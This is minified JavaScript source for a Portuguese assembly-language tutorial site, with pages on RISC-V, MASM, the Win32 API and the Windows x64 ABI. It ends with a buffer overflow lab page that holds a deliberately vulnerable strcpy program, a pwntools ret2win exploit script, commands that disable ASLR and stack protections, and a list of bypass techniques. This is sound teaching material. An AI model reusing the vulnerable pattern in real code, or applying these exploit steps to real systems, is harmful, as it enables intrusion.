    RET`})]})}function M1(){return r.jsxs(L,{title:"Introdução ao RISC-V",subtitle:"A ISA aberta e modular que está conquistando o mundo embedded e acadêmico",difficulty:"intermediario",timeToRead:"15 min",children:[r.jsxs("p",{children:[r.jsx("strong",{children:"RISC-V"}),' (pronuncia-se "RISC five") é uma arquitetura de conjunto de instruções (ISA) aberta e livre de royalties, desenvolvida na UC Berkeley. É modular, extensível e está crescendo rapidamente em aplicações embedded, HPC e pesquisa acadêmica.']}),r.jsx("h2",{children:"Por que RISC-V é Especial"}),r.jsxs("ul",{children:[r.jsxs("li",{children:[r.jsx("strong",{children:"Open Source:"})," Qualquer empresa pode implementar RISC-V sem pagar royalties"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"Modular:"})," Base mínima (RV32I) + extensões opcionais (M, A, F, D, C...)"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"Limpo:"})," Design moderno sem 40 anos de bagagem legada como x86"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"Crescimento:"})," SiFive, RISC-V em chips NVIDIA, Google, Western Digital"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"Acadêmico:"})," Plataforma padrão em cursos de arquitetura de computadores"]})]}),r.jsx("h2",{children:"Extensões RISC-V"}),r.jsxs("table",{children:[r.jsx("thead",{children:r.jsxs("tr",{children:[r.jsx("th",{children:"Extensão"}),r.jsx("th",{children:"Significado"}),r.jsx("th",{children:"Instruções adicionadas"})]})}),r.jsx("tbody",{children:[["RV32I/RV64I","Base integer","Instruções inteiras básicas"],["M","Multiply/Divide","MUL, DIV, REM"],["A","Atomic","Load-reserved/Store-conditional"],["F","Float","Ponto flutuante 32-bit"],["D","Double","Ponto flutuante 64-bit"],["C","Compressed","Instruções de 16-bit (como Thumb)"],["V","Vector","Instruções SIMD vetoriais"],["G","General","= IMAFD (conjunto completo padrão)"]].map(([i,l,u])=>r.jsxs("tr",{children:[r.jsx("td",{children:r.jsx("code",{children:i})}),r.jsx("td",{children:l}),r.jsx("td",{children:u})]},i))})]}),r.jsx("h2",{children:"Hello World em RISC-V (Linux)"}),r.jsx(d,{language:"bash",filename:"hello_riscv.s",code:`# hello_riscv.s — RISC-V 64-bit Linux
# Compilar: riscv64-linux-gnu-as hello_riscv.s -o hello.o
#           riscv64-linux-gnu-ld hello.o -o hello
# Executar: qemu-riscv64 ./hello

.section .data
msg:    .ascii "Hello, RISC-V!\\n"
msg_len = . - msg

.section .text
.global _start

_start:
    # write(1, msg, msg_len)
    li a7, 64           # syscall: sys_write (RISC-V Linux)
    li a0, 1            # fd = stdout
    la a1, msg          # a1 = &msg
    li a2, msg_len      # a2 = tamanho
    ecall               # system call (não syscall nem svc!)

    # exit(0)
    li a7, 93           # syscall: sys_exit
    li a0, 0            # exit code = 0
    ecall`}),r.jsxs(T,{type:"info",title:"ECALL em RISC-V",children:["Em RISC-V, a instrução para fazer system call é ",r.jsx("code",{children:"ecall"})," (Environment Call). O número da syscall vai em ",r.jsx("code",{children:"a7"}),", e os argumentos em ",r.jsx("code",{children:"a0-a5"}),". O retorno vem em ",r.jsx("code",{children:"a0"}),"."]}),r.jsx("h2",{children:"Ferramentas RISC-V"}),r.jsx(d,{language:"bash",code:`# Instalar toolchain RISC-V (Ubuntu):
sudo apt install gcc-riscv64-linux-gnu binutils-riscv64-linux-gnu
sudo apt install qemu-user    # para emulação

# Compilar:
riscv64-linux-gnu-gcc -march=rv64gc -o programa programa.c
riscv64-linux-gnu-as -march=rv64gc programa.s -o programa.o
riscv64-linux-gnu-ld programa.o -o programa

# Executar no x86 via QEMU:
qemu-riscv64 ./programa

# Emulador completo (QEMU system):
qemu-system-riscv64 -machine virt -bios fw_jump.bin -kernel Image ...

# Hardware real:
# - SiFive HiFive Unmatched (~$665)
# - Lichee Pi 4A (~$100)
# - StarFive VisionFive 2 (~$55)`}),r.jsx("h2",{children:"RISC-V vs ARM vs x86"}),r.jsxs("table",{children:[r.jsx("thead",{children:r.jsxs("tr",{children:[r.jsx("th",{children:"Característica"}),r.jsx("th",{children:"x86-64"}),r.jsx("th",{children:"ARM64"}),r.jsx("th",{children:"RISC-V 64"})]})}),r.jsx("tbody",{children:[["Tipo","CISC","RISC","RISC"],["Registradores","16","31","32"],["Tamanho instrução","1-15 bytes","4 bytes","2-4 bytes (com C)"],["Licença","Intel/AMD","ARM Ltd.","Aberto/livre"],["Syscall instrução","syscall","svc","ecall"],["Zero register","implícito","XZR","x0"]].map(([i,l,u,m])=>r.jsxs("tr",{children:[r.jsx("td",{children:i}),r.jsx("td",{children:l}),r.jsx("td",{children:u}),r.jsx("td",{children:m})]},i))})]})]})}function O1(){return r.jsxs(L,{title:"Registradores RISC-V",subtitle:"Os 32 registradores, convenções de nome e ABI",difficulty:"intermediario",timeToRead:"10 min",children:[r.jsx("p",{children:"RISC-V tem 32 registradores de propósito geral (x0-x31). Cada um tem um nome ABI que indica seu uso convencional."}),r.jsx("h2",{children:"Tabela de Registradores RISC-V"}),r.jsxs("table",{children:[r.jsx("thead",{children:r.jsxs("tr",{children:[r.jsx("th",{children:"Registrador"}),r.jsx("th",{children:"ABI Name"}),r.jsx("th",{children:"Uso"}),r.jsx("th",{children:"Salvo por"})]})}),r.jsx("tbody",{children:[["x0","zero","Sempre zero (imutável)","N/A"],["x1","ra","Return Address (endereço de retorno)","Caller"],["x2","sp","Stack Pointer","Callee"],["x3","gp","Global Pointer","N/A"],["x4","tp","Thread Pointer","N/A"],["x5","t0","Temporário / alternativo RA","Caller"],["x6-x7","t1-t2","Temporários","Caller"],["x8","s0/fp","Saved / Frame Pointer","Callee"],["x9","s1","Saved register","Callee"],["x10-x11","a0-a1","Args / Return values","Caller"],["x12-x17","a2-a7","Argumentos 3-8","Caller"],["x18-x27","s2-s11","Saved registers","Callee"],["x28-x31","t3-t6","Temporários","Caller"]].map(([i,l,u,m])=>r.jsxs("tr",{children:[r.jsx("td",{children:r.jsx("code",{children:i})}),r.jsx("td",{children:r.jsx("code",{children:l})}),r.jsx("td",{children:u}),r.jsx("td",{children:m})]},i))})]}),r.jsx("h2",{children:"Registradores Mais Usados"}),r.jsx(d,{language:"bash",code:`# x0 (zero) — sempre retorna 0, escritas são descartadas:
add a0, x0, x0    # a0 = 0 + 0 = 0 (equivale a: li a0, 0)
addi a0, x0, 42   # a0 = 0 + 42 = 42 (equivale a: li a0, 42)

# ra (x1) — Return Address:
# CALL salva o endereço de retorno em ra automaticamente
# Se a função chama outra função, deve salvar/restaurar ra

# sp (x2) — Stack Pointer:
# Cresce para baixo (como x86)
addi sp, sp, -16    # alocar 16 bytes na stack
# ... uso da stack ...
addi sp, sp, 16     # desalocar

# a0-a7 (x10-x17) — Argumentos:
# a0 e a1 também são os registradores de retorno
# func(a, b, c) → a em a0, b em a1, c em a2
# retorno simples em a0, retorno de 128-bit em a0:a1`}),r.jsx("h2",{children:"Registradores de Float (F e D extensions)"}),r.jsx(d,{language:"bash",code:`# Com extensão F (float) ou D (double):
# ft0-ft7: float temporaries (caller-saved)
# fa0-fa7: float arguments/return values
# fs0-fs11: float saved (callee-saved)
# (ft8-ft11: mais temporários)

# Total: 32 registradores float (f0-f31)
# Em RV64D, cada registrador é de 64-bit (double)
# Registradores float separados dos inteiros!`}),r.jsx("h2",{children:"CSRs — Control and Status Registers"}),r.jsx(d,{language:"bash",code:`# CSRs são registradores de controle do sistema
# Acessados com instruções especiais:
csrr a0, mhartid    # ler hardware thread ID (RISC-V usa 'harts')
csrr a0, mstatus    # ler machine status register
csrw mstatus, a0    # escrever em CSR
csrrs a0, mstatus, a1  # ler e setar bits
csrrc a0, mstatus, a1  # ler e limpar bits

# CSRs importantes:
# mhartid:   ID do hart (hart = hardware thread = CPU core)
# mstatus:   Status do processador (modo, interrupt enable, etc.)
# mtvec:     Trap Vector (endereço do handler de exceção)
# mepc:      Machine Exception Program Counter
# mcause:    Causa da última exceção
# satp:      Supervisor Address Translation and Protection (paginação)`})]})}function D1(){return r.jsxs(L,{title:"Instruções RISC-V",subtitle:"O conjunto base RV64I e pseudoinstruções",difficulty:"intermediario",timeToRead:"18 min",children:[r.jsx("p",{children:"RISC-V tem um conjunto de instruções muito limpo. A base RV64I tem apenas ~47 instruções. Pseudoinstruções são implementadas pelo assembler usando 1-2 instruções reais."}),r.jsx("h2",{children:"Instruções Aritméticas"}),r.jsx(d,{language:"bash",filename:"arith.s",code:`# Formato R: OP rd, rs1, rs2
add  a0, a0, a1    # a0 = a0 + a1
sub  a0, a0, a1    # a0 = a0 - a1
and  a0, a0, a1    # a0 = a0 & a1
or   a0, a0, a1    # a0 = a0 | a1
xor  a0, a0, a1    # a0 = a0 ^ a1
sll  a0, a0, a1    # a0 = a0 << a1 (shift left logical)
srl  a0, a0, a1    # a0 = a0 >> a1 (shift right logical)
sra  a0, a0, a1    # a0 = a0 >> a1 (shift right arithmetic)
slt  a0, a1, a2    # a0 = (a1 < a2) ? 1 : 0 (signed)
sltu a0, a1, a2    # a0 = (a1 < a2) ? 1 : 0 (unsigned)

# Com M extension (multiplicação/divisão):
mul    a0, a0, a1  # a0 = a0 * a1 (low 64 bits)
mulh   a0, a0, a1  # a0 = (a0 * a1) >> 64 (high bits, signed)
mulhu  a0, a0, a1  # high bits, unsigned
div    a0, a0, a1  # a0 = a0 / a1 (signed)
divu   a0, a0, a1  # unsigned
rem    a0, a0, a1  # a0 = a0 % a1 (remainder, signed)
remu   a0, a0, a1  # unsigned

# Formato I: OP rd, rs1, imm (imediato de 12 bits, -2048 a 2047)
addi a0, a0, 10    # a0 += 10
addi sp, sp, -16   # sp -= 16 (alocar stack)
xori a0, a0, -1    # a0 = ~a0 (NOT via XOR com -1)
slli a0, a0, 3     # a0 <<= 3 (× 8)
srli a0, a0, 1     # a0 >>= 1 (unsigned)
srai a0, a0, 1     # a0 >>= 1 (signed, mantém sinal)
slti a0, a1, 100   # a0 = (a1 < 100) ? 1 : 0`}),r.jsx("h2",{children:"LOAD e STORE"}),r.jsx(d,{language:"bash",filename:"mem.s",code:`# LOAD: LD rd, offset(rs1)
ld   a0, 0(sp)     # a0 = *(sp + 0) — 64-bit
lw   a0, 4(sp)     # a0 = *(sp + 4) — 32-bit signed extend
lwu  a0, 4(sp)     # 32-bit zero extend
lh   a0, 2(sp)     # 16-bit signed extend
lhu  a0, 2(sp)     # 16-bit zero extend
lb   a0, 0(sp)     # 8-bit signed extend
lbu  a0, 0(sp)     # 8-bit zero extend

# STORE: ST rs2, offset(rs1)
sd   a0, 0(sp)     # *(sp + 0) = a0 — 64-bit
sw   a0, 4(sp)     # 32-bit store
sh   a0, 2(sp)     # 16-bit store
sb   a0, 0(sp)     # 8-bit store`}),r.jsx("h2",{children:"Branches (Saltos Condicionais)"}),r.jsx(d,{language:"bash",filename:"branch.s",code:`# Branches comparam dois registradores (não usa flags separadas!)
beq  a0, a1, label  # pula se a0 == a1
bne  a0, a1, label  # pula se a0 != a1
blt  a0, a1, label  # pula se a0 < a1 (signed)
bge  a0, a1, label  # pula se a0 >= a1 (signed)
bltu a0, a1, label  # pula se a0 < a1 (unsigned)
bgeu a0, a1, label  # pula se a0 >= a1 (unsigned)`}),r.jsx("h2",{children:"Jump e Funções"}),r.jsx(d,{language:"bash",filename:"jumps.s",code:`# JAL — Jump And Link (call function)
jal  ra, funcao     # ra = PC+4; PC = funcao
jal  x0, label      # pula sem salvar (como JMP incondicional)

# JALR — Jump And Link Register (return / indirect call)
jalr x0, ra, 0      # PC = ra (retorno de função)
jalr ra, t1, 0      # ra = PC+4; PC = t1 (call indireto)

# LUI — Load Upper Immediate (12 bits altos de endereço)
lui  a0, %hi(valor)        # a0 = upper 20 bits
addi a0, a0, %lo(valor)   # adiciona lower 12 bits

# AUIPC — Add Upper Immediate to PC (endereçamento PC-relativo)
auipc a0, %pcrel_hi(label)   # a0 = PC + upper 20 bits
addi  a0, a0, %pcrel_lo(label) # a0 = &label`}),r.jsx("h2",{children:"Pseudoinstruções (Assembler Macros)"}),r.jsx(d,{language:"bash",filename:"pseudo.s",code:`# Pseudoinstruções — o assembler converte para instruções reais

# Movimento e constantes:
li   a0, 42        # Load Immediate — addi/lui conforme necessário
la   a0, label     # Load Address
mv   a0, a1        # Move (→ addi a0, a1, 0)

# Comparação e desvio:
beqz a0, label     # pula se a0 == 0 (→ beq a0, x0, label)
bnez a0, label     # pula se a0 != 0
blez a0, label     # pula se a0 <= 0
bltz a0, label     # pula se a0 < 0
bgtz a0, label     # pula se a0 > 0
bgez a0, label     # pula se a0 >= 0

# Salto e chamadas:
j    label         # pulo (→ jal x0, label)
jr   ra            # retorno (→ jalr x0, ra, 0)
call funcao        # chamada de função longa (auipc+jalr)
ret                # retorno (→ jalr x0, ra, 0)
tail funcao        # tail call (sem salvar ra)

# Operações:
nop                # no-op (→ addi x0, x0, 0)
not  a0, a1        # a0 = ~a1 (→ xori a0, a1, -1)
neg  a0, a1        # a0 = -a1 (→ sub a0, x0, a1)
seqz a0, a1        # a0 = (a1 == 0) ? 1 : 0 (→ sltiu a0, a1, 1)
snez a0, a1        # a0 = (a1 != 0) ? 1 : 0`}),r.jsx(T,{type:"success",title:"RISC-V é simples de aprender!",children:"Com apenas ~47 instruções base, RISC-V é a arquitetura mais fácil para aprender os conceitos de Assembly. As pseudoinstruções tornam o código legível sem adicionar complexidade à ISA base."})]})}function T1(){return r.jsxs(L,{title:"MASM — Microsoft Assembler",subtitle:"O montador padrão do Windows — sintaxe Intel diferenciada",difficulty:"intermediario",timeToRead:"12 min",children:[r.jsx("p",{children:"MASM (Microsoft Macro Assembler) é o montador padrão do ecossistema Windows. Inclui no Visual Studio e MSVC. Tem a mesma sintaxe Intel que o NASM, mas com diferenças importantes de diretivas e segmentação."}),r.jsx(T,{type:"info",title:"MASM vs NASM",children:"MASM e NASM usam ambos a sintaxe Intel (dest, src), mas têm diretivas diferentes. MASM é exclusivo do Windows. NASM é multiplataforma. Neste guia, priorizamos NASM, mas MASM é importante se você trabalha com Visual Studio."}),r.jsx("h2",{children:"Hello World em MASM"}),r.jsx(d,{language:"bash",filename:"hello_masm.asm",code:`; hello_masm.asm — Windows x64 com MASM
; Compilar: ml64 /c hello_masm.asm
; Linkar: link hello_masm.obj kernel32.lib /SUBSYSTEM:CONSOLE

.DATA
    msg DB "Hello, MASM!", 0Dh, 0Ah, 0   ; CR LF NUL

.CODE

; Declarações externas (MASM style):
EXTERN GetStdHandle:PROC
EXTERN WriteConsoleA:PROC
EXTERN ExitProcess:PROC

MAIN PROC
    ; Shadow space: reservar 32 bytes antes de qualquer CALL
    sub rsp, 56         ; 32 shadow + 16 alinhamento + 8 para parâmetro

    ; GetStdHandle(STD_OUTPUT_HANDLE = -11)
    mov rcx, -11
    call GetStdHandle
    mov rbx, rax        ; handle = stdout

    ; WriteConsoleA(handle, msg, len, &written, NULL)
    mov rcx, rbx                ; handle
    lea rdx, msg                ; MASM: não precisa de [rel]!
    mov r8, 15                  ; tamanho
    lea r9, QWORD PTR [rsp+32]  ; &bytesWritten (no shadow space)
    mov QWORD PTR [rsp+40], 0   ; 5º argumento na stack
    call WriteConsoleA

    ; ExitProcess(0)
    xor ecx, ecx
    call ExitProcess

MAIN ENDP

END`}),r.jsx("h2",{children:"Diretivas MASM vs NASM"}),r.jsxs("table",{children:[r.jsx("thead",{children:r.jsxs("tr",{children:[r.jsx("th",{children:"Conceito"}),r.jsx("th",{children:"NASM"}),r.jsx("th",{children:"MASM"})]})}),r.jsx("tbody",{children:[["Seção de código","section .text",".CODE"],["Seção de dados","section .data",".DATA"],["Seção BSS","section .bss",".DATA?"],["Definir byte","db 0x41","DB 41h"],["Definir dword","dd 42","DD 42"],["Definir qword","dq 42","DQ 42"],["Reservar bytes","resb 100","BYTE 100 DUP (?)"],["Constante","MY_CONST equ 42","MY_CONST EQU 42"],["Global","global foo","foo PROC (PUBLIC)"],["Extern","extern bar","EXTERN bar:PROC"],["Incluir arquivo","%include 'file.inc'","INCLUDE file.inc"]].map(([i,l,u])=>r.jsxs("tr",{children:[r.jsx("td",{children:i}),r.jsx("td",{children:r.jsx("code",{children:l})}),r.jsx("td",{children:r.jsx("code",{children:u})})]},i))})]}),r.jsx("h2",{children:"Macros MASM"}),r.jsx(d,{language:"bash",filename:"macros_masm.asm",code:`; Macros em MASM (sintaxe diferente do NASM):
; Macro sem argumentos:
PRINT_NEWLINE MACRO
    push rcx
    push rdx
    push r8
    push r9
    sub rsp, 32
    ; ... escrever CRLF ...
    add rsp, 32
    pop r9
    pop r8
    pop rdx
    pop rcx
ENDM

; Macro com argumentos:
INVOKE_FUNC MACRO funcname, arg1, arg2
    mov rcx, arg1
    mov rdx, arg2
    call funcname
ENDM

; Usar:
INVOKE_FUNC MyFunction, rax, rbx

; INVOKE — equivalente de MASM para chamadas tipo C:
INVOKE ExitProcess, 0  ; substitui: mov ecx, 0; call ExitProcess`}),r.jsx("h2",{children:"MASM com Visual Studio"}),r.jsx(d,{language:"bash",code:`# No Visual Studio:
# Project → Add → New Item → C++ File → renomear para .asm
# Project Properties → Custom Build Tool → Command: ml64 /c "%(FullPath)"

# Linha de comando com MASM:
# Abrir Developer Command Prompt for VS 2022
ml64 arquivo.asm               # assemblar e linkar
ml64 /c arquivo.asm            # apenas assemblar (gera .obj)
link arquivo.obj kernel32.lib  # linkar manualmente`})]})}function q1(){return r.jsxs(L,{title:"Win32 API em Assembly",subtitle:"Chamando funções do Windows diretamente de Assembly",difficulty:"avancado",timeToRead:"15 min",children:[r.jsx("p",{children:"A Win32 API é a interface de programação do Windows. Em Assembly, você pode chamar qualquer função Win32 diretamente, seguindo a convenção Microsoft x64."}),r.jsx("h2",{children:"Conceitos Fundamentais"}),r.jsxs("ul",{children:[r.jsxs("li",{children:[r.jsx("strong",{children:"HANDLE:"})," Identificador opaco (ponteiro de 64-bit) para objetos do sistema"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"BOOL:"})," Inteiro de 32-bit (0=FALSE, não-zero=TRUE)"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"LPSTR/LPCSTR:"})," Ponteiro para string (char*)"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"HWND, HINSTANCE:"})," HANDLEs específicos para janelas"]}),r.jsxs("li",{children:[r.jsx("strong",{children:"DLL:"})," kernel32.dll, user32.dll, gdi32.dll são as DLLs base"]})]}),r.jsx("h2",{children:"Janela Win32 Básica"}),r.jsx(d,{language:"nasm",filename:"janela.asm",code:`; Janela Win32 mínima em Assembly (NASM, Windows x64)
; Compilar: nasm -f win64 janela.asm -o janela.obj
; Linkar: link janela.obj kernel32.lib user32.lib /SUBSYSTEM:WINDOWS /ENTRY:WinMain

extern MessageBoxA
extern ExitProcess
extern GetModuleHandleA

section .data
    titulo  db "Assembly Windows", 0
    texto   db "Hello, Win32 API em Assembly!", 0

section .text
    global WinMain

WinMain:
    sub rsp, 40         ; shadow space + alinhamento

    ; MessageBoxA(hwnd, text, caption, type)
    xor ecx, ecx        ; hwnd = NULL
    lea rdx, [rel texto]    ; lpText
    lea r8,  [rel titulo]   ; lpCaption
    mov r9d, 0              ; MB_OK
    call MessageBoxA

    ; ExitProcess(0)
    xor ecx, ecx
    call ExitProcess`}),r.jsx("h2",{children:"File I/O Win32"}),r.jsx(d,{language:"nasm",filename:"file_win32.asm",code:`; Ler e escrever arquivo com Win32 API
extern CreateFileA
extern ReadFile
extern WriteFile
extern CloseHandle
extern ExitProcess

GENERIC_READ    equ 0x80000000
GENERIC_WRITE   equ 0x40000000
OPEN_EXISTING   equ 3
CREATE_ALWAYS   equ 2

section .data
    filename     db "C:\\teste.txt", 0
    write_data   db "Escrito pelo Assembly!", 0
    write_len    equ $ - write_data - 1

section .bss
    read_buf     resb 256
    bytes_rw     resd 1    ; DWORD para bytes read/written

section .text
    global _start

_start:
    sub rsp, 56

    ; CreateFileA(path, access, share, security, disp, attr, template)
    lea rcx, [rel filename]     ; lpFileName
    mov rdx, GENERIC_WRITE      ; dwDesiredAccess
    xor r8, r8                  ; dwShareMode = 0
    xor r9, r9                  ; lpSecurityAttributes = NULL
    mov QWORD [rsp+32], CREATE_ALWAYS  ; dwCreationDisposition
    mov QWORD [rsp+40], 0x80    ; dwFlagsAndAttributes = NORMAL
    mov QWORD [rsp+48], 0       ; hTemplateFile = NULL
    call CreateFileA
    ; rax = HANDLE (ou INVALID_HANDLE_VALUE = -1)
    cmp rax, -1
    je .erro
    mov rbx, rax                ; salva handle

    ; WriteFile(handle, buffer, size, &bytesWritten, NULL)
    mov rcx, rbx                ; hFile
    lea rdx, [rel write_data]   ; lpBuffer
    mov r8,  write_len          ; nNumberOfBytesToWrite
    lea r9,  [rel bytes_rw]     ; lpNumberOfBytesWritten
    mov QWORD [rsp+32], 0       ; lpOverlapped = NULL
    call WriteFile

    ; CloseHandle(handle)
    mov rcx, rbx
    call CloseHandle

.erro:
    ; ExitProcess(0)
    xor ecx, ecx
    call ExitProcess`}),r.jsx("h2",{children:"LoadLibrary e GetProcAddress"}),r.jsx(d,{language:"nasm",filename:"dynamic_lib.asm",code:`; Carregar DLL e função em tempo de execução:
extern LoadLibraryA
extern GetProcAddress

section .data
    lib_name db "user32.dll", 0
    fn_name  db "MessageBoxW", 0

section .text
    sub rsp, 32

    ; LoadLibraryA("user32.dll")
    lea rcx, [rel lib_name]
    call LoadLibraryA
    ; rax = HMODULE

    test rax, rax
    jz .erro
    mov rbx, rax            ; salva HMODULE

    ; GetProcAddress(hModule, "MessageBoxW")
    mov rcx, rbx
    lea rdx, [rel fn_name]
    call GetProcAddress
    ; rax = ponteiro para a função

    test rax, rax
    jz .erro

    ; Chamar a função encontrada:
    ; MessageBoxW(NULL, L"Hello", L"Title", MB_OK)
    mov r11, rax            ; salva ponteiro da função
    xor ecx, ecx
    ; ... configurar argumentos para MessageBoxW ...
    call r11                ; chama indiretamente!`})]})}function N1(){return r.jsxs(L,{title:"Windows x64 ABI Avançado",subtitle:"Unwind data, structured exceptions e C++ interop no Windows",difficulty:"expert",timeToRead:"15 min",children:[r.jsx("p",{children:"Além da calling convention básica, o Windows x64 ABI define estruturas adicionais para exception handling, stack unwinding e debugging. Essenciais para funções Assembly que interagem com C++ no Windows."}),r.jsx("h2",{children:"Unwind Data — Por que Necessário"}),r.jsx(T,{type:"warning",title:"Stack Unwinding Obrigatório",children:'No Windows x64, toda função não-leaf DEVE ter metadata de "unwind" no executável. Sem isso, o runtime de C++ não consegue propagar exceções ou gerar stack traces através da sua função Assembly. O programa pode terminar abruptamente.'}),r.jsx(d,{language:"bash",code:`# Windows usa "table-driven exception handling"
# Cada função tem uma entrada em .pdata (section de dados de exceção):
#   - Endereço inicial da função
#   - Endereço final da função  
#   - Ponteiro para UNWIND_INFO

# UNWIND_INFO descreve:
#   - Versão e flags
#   - Tamanho do prólogo
#   - Códigos de unwind (o que o prólogo faz)
#   - Handler de exceção (se houver)`}),r.jsx("h2",{children:"Declarando Unwind Data em NASM"}),r.jsx(d,{language:"nasm",filename:"unwind.asm",code:`; Unwind data para função Assembly no Windows
; Requer NASM 2.14+ e link com /PDATA

section .pdata rdata align=4

; Estrutura RUNTIME_FUNCTION:
    DD funcao_begin         ; BeginAddress (RVA)
    DD funcao_end           ; EndAddress (RVA)
    DD unwind_info          ; UnwindData (RVA)

section .xdata rdata align=8

unwind_info:
    DB 1                    ; Version=1, Flags=0 (sem handler)
    DB (funcao_begin_after_prolog - funcao_begin)  ; SizeOfProlog
    DB 3                    ; CountOfUnwindCodes = 3 operações
    DB 0                    ; FrameRegister=0, FrameOffset=0
    
    ; Códigos de unwind (em ordem reversa da execução do prólogo!):
    ; 1. sub rsp, 32 (alocar shadow space)
    DB (push_after_sub - funcao_begin) ; offset onde SUB foi feito
    DB 0x72                 ; UWOP_ALLOC_SMALL, size = 32 bytes
    
    ; 2. push r12 (save non-volatile)
    DB (push_r12 - funcao_begin)       ; offset
    DB (0x03 | (12 << 4))  ; UWOP_PUSH_NONVOL, register = R12
    
    ; 3. push rbp
    DB (push_rbp - funcao_begin)
    DB (0x03 | (5 << 4))   ; UWOP_PUSH_NONVOL, register = RBP

section .text

funcao_begin:
push_rbp:
    push rbp
    mov  rbp, rsp
push_r12:
    push r12
push_after_sub:
    sub  rsp, 32        ; shadow space

funcao_begin_after_prolog:
    ; corpo da função ...

    add rsp, 32
    pop r12
    pop rbp
    ret

funcao_end:`}),r.jsx("h2",{children:"Structured Exception Handling (SEH)"}),r.jsx(d,{language:"c",filename:"seh.c",code:`// SEH em C (Windows-specific):
__try {
    // código que pode gerar exceção
    int *ptr = NULL;
    *ptr = 42;  // access violation
}
__except (EXCEPTION_EXECUTE_HANDLER) {
    // handler de exceção
    printf("Exceção capturada!\\n");
}
__finally {
    // sempre executa (cleanup)
    printf("Finalizando...\\n");
}`}),r.jsx("h2",{children:"Verificando ABI com dumpbin"}),r.jsx(d,{language:"bash",code:`# dumpbin — ferramenta da Microsoft para analisar binários:
dumpbin /headers programa.exe
dumpbin /imports programa.exe      # DLLs importadas
dumpbin /exports minha.dll         # funções exportadas
dumpbin /pdata programa.exe        # unwind data
dumpbin /disasm:nobytes meu.obj    # disassembly

# Verificar se função tem unwind data:
dumpbin /pdata programa.exe | findstr "minha_funcao"`})]})}function L1(){return r.jsxs(L,{title:"Buffer Overflow",subtitle:"Como buffers estouram e sobrescrevem o endereço de retorno",difficulty:"expert",timeToRead:"25 min",children:[r.jsx(T,{type:"danger",title:"Uso Educacional",children:"Este conteúdo é exclusivamente para fins educacionais e pesquisa de segurança. Explorar vulnerabilidades sem autorização é ilegal. Use apenas em ambientes de CTF, VMs de laboratório ou sistemas que você possui."}),r.jsx("p",{children:"Buffer overflow é uma das vulnerabilidades mais antigas e mais exploradas. Acontece quando dados são escritos além dos limites de um buffer, sobrescrevendo dados adjacentes na memória — incluindo o endereço de retorno."}),r.jsx("h2",{children:"A Vulnerabilidade"}),r.jsx(d,{language:"c",filename:"vuln.c",code:`// Programa vulnerável:
#include <stdio.h>
#include <string.h>

void funcao_secreta() {
    printf("Você nunca deveria chegar aqui!\\n");
    // system("/bin/sh");  // em exploits reais
}

void vulneravel(char *input) {
    char buffer[64];        // buffer de 64 bytes
    strcpy(buffer, input);  // VULNERÁVEL: não verifica tamanho!
}

int main(int argc, char *argv[]) {
    vulneravel(argv[1]);
    return 0;
}

// Compilar sem proteções (para laboratório):
// gcc -o vuln vuln.c -fno-stack-protector -z execstack -no-pie`}),r.jsx("h2",{children:"A Stack Durante a Execução"}),r.jsx(d,{language:"bash",code:`# Stack frame de vulneravel() com input = "AAAA...":
# Endereços crescentes ↑
#
# [rbp + 8]   = endereço de retorno para main  ← alvo!
# [rbp + 0]   = rbp salvo
# [rbp - 8]   = (possível canary)
# [rbp - 72]  = buffer[63]  → último byte do buffer
# [rbp - 72]  = buffer[0]   ← strcpy começa aqui
#
# Se input tem 73+ bytes, estoura o buffer e sobrescreve rbp
# Se input tem 81+ bytes, sobrescreve o endereço de retorno!`}),r.jsx("h2",{children:"Encontrando o Offset"}),r.jsx(d,{language:"bash",code:`# Usar padrão de bytes únicos para encontrar o offset:
python3 -c "import sys; sys.stdout.buffer.write(b'A'*64 + b'B'*8 + b'C'*8)" > payload.bin
./vuln $(cat payload.bin)
# Olhar no GDB: quando RIP = 0x4343434343434343, o offset é 72 bytes

# Com pwntools:
python3 << 'EOF'
from pwn import *
p = cyclic(200)  # gera padrão único de 200 bytes
print(p)
EOF
./vuln $(python3 -c "from pwn import *; print(cyclic(200).decode())")
# No GDB: p cyclic_find(rip_value)  → encontra o offset`}),r.jsx("h2",{children:"Exploit Básico (ret2win)"}),r.jsx(d,{language:"python",filename:"exploit.py",code:`#!/usr/bin/env python3
# exploit.py — ret2win: redirecionar para funcao_secreta()
from pwn import *

# Configurar
elf = ELF('./vuln')
p = process('./vuln')

# Endereço da função "secreta"
target = elf.symbols['funcao_secreta']
print(f"[*] Endereço alvo: {hex(target)}")

# Payload: 72 bytes de padding + endereço alvo
offset = 72
payload = b'A' * offset
payload += p64(target)  # substitui endereço de retorno

# Enviar
p.sendline(payload)
p.interactive()`}),r.jsx("h2",{children:"Proteções e Como Funcionam"}),r.jsx(d,{language:"bash",code:`# ASLR — Address Space Layout Randomization:
# Randomiza endereços de stack, heap e bibliotecas
cat /proc/sys/kernel/randomize_va_space  # 2 = ASLR completo
# Bypass: informação de leak, ret2libc, heap spray

# NX (No-Execute) / DEP:
# Stack e heap não são executáveis — shellcode na stack não funciona
# Bypass: ROP (Return Oriented Programming)

# Stack Canary:
# Valor aleatório entre buffer e endereço de retorno
# Verificado antes do RET — se mudou, programa termina
# Bypass: leak do canary, format string

# PIE — Position Independent Executable:
# O executável em si é randomizado (não só bibliotecas)
# Bypass: leak de endereço do binário

# Full RELRO:
# GOT somente leitura — não pode sobrescrever ponteiros de função
# Bypass: técnicas avançadas`}),r.jsx("h2",{children:"Desabilitando Proteções (laboratório)"}),r.jsx(d,{language:"bash",code:`# Para praticar em laboratório:
# Desabilitar ASLR:
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

# Compilar sem proteções:
gcc -o vuln vuln.c \\
    -fno-stack-protector \\  # sem canary
    -z execstack \\           # stack executável
    -no-pie \\               # sem PIE
    -D_FORTIFY_SOURCE=0      # sem fortify

# Verificar:
checksec --file=vuln
